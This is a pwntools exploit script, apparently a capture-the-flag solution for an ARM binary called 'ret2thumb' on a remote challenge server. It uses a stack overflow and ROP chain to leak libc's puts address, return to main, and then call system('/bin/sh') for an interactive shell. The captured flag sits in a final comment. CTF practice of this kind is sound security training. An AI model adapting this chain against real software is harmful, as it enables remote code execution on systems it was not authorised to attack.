from pwn import *


'''
leak puts libc address
ret2main
call system('/bin/sh')

'''



bin_sh_address = 0x0010570
got_plt_puts = 0x11fe8
libc = ELF('lib/libc.so.6')

print('puts offset: ', hex(libc.symbols["puts"]))

puts_offset = libc.symbols["puts"]
system_offset = libc.symbols["system"]

#r = process(["qemu-arm","-L", ".", "-g", "4444"  ,"./ret2thumb"]) # debug with gdb-multiarch --command=remote_script
#r= process(["qemu-arm","-L", "." ,"./ret2thumb"]) # normal

r = remote("chal.nbctf.com",30175)
sleep(1)


r.recv()

padd = b'A'*36
pop_r3_pc  = 0x00010388
mov_r0_r3_pop_fp_pc = 0x00010550
main_address = 0x00010510
puts_plt = 0x103b8


# leak puts libc and ret2main
payload = padd
payload += p32(pop_r3_pc)
payload += p32(got_plt_puts)
payload += p32(mov_r0_r3_pop_fp_pc)
payload += b'B'*4
payload += p32(puts_plt)
payload += p32(main_address)*100  # spray stack with main_address in order to ret2main


r.sendline(payload)


puts_libc_leak = u32(r.recv().split(b"\n")[0])
print(hex(puts_libc_leak))
libc_base = puts_libc_leak - puts_offset
system_address = libc_base + system_offset


# call system("/bin/sh")
payload2 = padd
payload2 += p32(pop_r3_pc)
payload2 += p32(bin_sh_address)
payload2 += p32(mov_r0_r3_pop_fp_pc)
payload2 += b'B'*4
payload2 += p32(system_address)


r.sendline(payload2)

r.interactive()


# nbctf{4rm_i5_fUn!!!_a9fa38}